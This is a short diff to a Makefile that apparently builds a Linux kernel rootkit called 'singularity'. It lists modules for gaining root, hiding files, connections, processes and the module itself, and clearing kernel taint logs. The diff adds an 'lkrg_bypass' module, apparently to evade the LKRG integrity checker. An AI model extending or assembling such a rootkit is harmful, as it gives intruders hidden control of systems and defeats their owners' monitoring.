@@ -5,7 +5,6 @@ singularity-objs := main.o \
     modules/become_root.o \
     modules/hiding_directory.o \
     modules/hiding_tcp.o \
-    modules/hooking_insmod.o \
     modules/clear_taint_dmesg.o \
     modules/hidden_pids.o \
     modules/hiding_stat.o \
@@ -16,6 +15,8 @@ singularity-objs := main.o \
     modules/bpf_hook.o \
     modules/icmp.o \
     modules/audit.o \
+    modules/task.o \
+    modules/lkrg_bypass.o \
     modules/hide_module.o modules/trace.o ftrace/ftrace_helper.o
 
 all:
